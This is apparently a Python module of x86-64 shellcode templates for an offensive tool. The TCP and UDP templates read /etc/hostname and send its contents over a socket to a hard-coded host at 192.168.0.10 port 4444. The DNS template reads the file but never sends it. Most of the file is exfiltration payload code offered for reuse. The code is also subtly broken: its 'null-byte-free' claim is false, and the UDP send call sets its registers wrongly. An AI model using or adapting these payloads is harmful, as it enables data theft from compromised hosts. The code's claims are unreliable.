"""
templates_v2.py - Shellcode PIC (Position Independent Code) V2
"""

TEMPLATES = {
    
    "dns_query_header": '''
; DNS Query Header - Shellcode PIC (null-byte-free)
xor rax, rax
mov al, 0x0B
mov byte [rdi], al
mov al, 0xAA
mov byte [rdi+1], al
mov al, 0x01
mov byte [rdi+2], al
xor rax, rax
mov byte [rdi+3], al
mov al, 0x00
mov byte [rdi+4], al
mov al, 0x01
mov byte [rdi+5], al
mov al, 0x00
mov byte [rdi+6], al
mov byte [rdi+7], al
mov byte [rdi+8], al
mov byte [rdi+9], al
mov byte [rdi+10], al
mov byte [rdi+11], al
ret
''',

    "dns_exfil": '''
; DNS Exfiltration - Shellcode PIC (null-byte-free)
push rbp
mov rbp, rsp
sub rsp, 512

xor r10, r10
xor r11, r11

lea rdi, [rel filename]
xor rax, rax
mov al, 2
xor rsi, rsi
xor rdx, rdx
syscall

cmp rax, 0
jl exit_fail

mov r8, rax

mov rdi, r8
mov rsi, rbp
sub rsi, 256
mov rdx, 255
xor rax, rax
syscall
mov r9, rax

xor rdi, rdi
xor rax, rax
mov al, 60
syscall

exit_fail:
mov rdi, 1
xor rax, rax
mov al, 60
syscall

filename:
db "/etc/hostname", 0
''',

    "tcp_exfil": '''
; TCP Exfiltration - Shellcode PIC (null-byte-free)
push rbp
mov rbp, rsp
sub rsp, 256

lea rdi, [rel filename]
xor rax, rax
mov al, 2
xor rsi, rsi
xor rdx, rdx
syscall

cmp rax, 0
jl exit_fail

mov r8, rax

mov rdi, r8
mov rsi, rbp
sub rsi, 256
mov rdx, 255
xor rax, rax
syscall
mov r9, rax

mov rdi, 2
mov rsi, 1
xor rdx, rdx
xor rax, rax
mov al, 41
syscall
mov r10, rax

lea rax, [rbp - 256 - 16]
mov word [rax], 2
mov word [rax + 2], 0x5c11
mov dword [rax + 4], 0x0a00a8c0

mov rdi, r10
mov rsi, rax
mov rdx, 16
xor rax, rax
mov al, 42
syscall

mov rdi, r10
mov rsi, rbp
sub rsi, 256
mov rdx, r9
xor rax, rax
mov al, 44
syscall

xor rdi, rdi
xor rax, rax
mov al, 60
syscall

exit_fail:
mov rdi, 1
xor rax, rax
mov al, 60
syscall

filename:
db "/etc/hostname", 0
''',

    "udp_exfil": '''
; UDP Exfiltration - Shellcode PIC (null-byte-free)
push rbp
mov rbp, rsp
sub rsp, 256

lea rdi, [rel filename]
xor rax, rax
mov al, 2
xor rsi, rsi
xor rdx, rdx
syscall

cmp rax, 0
jl exit_fail

mov r8, rax

mov rdi, r8
mov rsi, rbp
sub rsi, 256
mov rdx, 255
xor rax, rax
syscall
mov r9, rax

mov rdi, 2
mov rsi, 2
xor rdx, rdx
xor rax, rax
mov al, 41
syscall
mov r10, rax

lea rax, [rbp - 256 - 16]
mov word [rax], 2
mov word [rax + 2], 0x5c11
mov dword [rax + 4], 0x0a00a8c0

mov rdi, r10
mov rsi, rbp
sub rsi, 256
mov rdx, r9
xor r8, r8
mov r9, rax
mov r10, 16
xor rax, rax
mov al, 44
syscall

xor rdi, rdi
xor rax, rax
mov al, 60
syscall

exit_fail:
mov rdi, 1
xor rax, rax
mov al, 60
syscall

filename:
db "/etc/hostname", 0
'''
}

def get_template(template_type: str) -> str:
    return TEMPLATES.get(template_type, None)

def list_templates() -> list:
    return list(TEMPLATES.keys())
